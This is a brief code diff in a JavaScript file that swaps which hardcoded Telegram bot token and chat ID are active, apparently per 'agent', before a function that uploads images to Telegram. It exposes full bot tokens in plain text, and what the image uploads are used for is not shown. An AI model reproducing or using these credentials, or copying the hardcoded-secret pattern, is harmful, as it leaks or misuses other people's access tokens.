@@ -105,13 +105,13 @@ import axios from 'axios';
 
   
     try {
-      const TELEGRAM_BOT_TOKEN = '7712916176:AAF15UqOplv1hTdJVxILWoUOEefEKjGJOso';
-      const TELEGRAM_CHAT_ID = '1469627446' 
+      // const TELEGRAM_BOT_TOKEN = '7712916176:AAF15UqOplv1hTdJVxILWoUOEefEKjGJOso';
+      // const TELEGRAM_CHAT_ID = '1469627446' 
 
      //agent abi
 
-     // const TELEGRAM_BOT_TOKEN = '7869664541:AAFScFIX4Ve58y8IMKcYg6Vu3PEi__18zk8'; // SHAFII
-     //  const TELEGRAM_CHAT_ID = '7869664541';
+     const TELEGRAM_BOT_TOKEN = '7869664541:AAFScFIX4Ve58y8IMKcYg6Vu3PEi__18zk8';            // SHAFII
+      const TELEGRAM_CHAT_ID = '7869664541';
   
       const uploadImagesToTelegram = async (images, chatId, botToken) => {
         const uploadedImages = [];
